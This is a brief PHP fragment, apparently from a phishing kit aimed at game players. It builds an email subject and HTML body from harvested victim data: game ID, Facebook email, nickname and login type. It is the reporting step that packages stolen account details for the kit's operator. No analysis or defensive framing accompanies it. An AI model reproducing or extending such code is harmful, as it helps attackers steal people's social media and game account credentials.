...
$subjek = "$arpantek_flag | ID GAME $playid | EMAIL FB $emails1s | NICKNAME $nick | LOGIN $login";
$pesan = '
<center> 
...
<th style="width: 78%; text-align: center;"><b>'.$emails1s.'</th> 
</tr>
<tr>
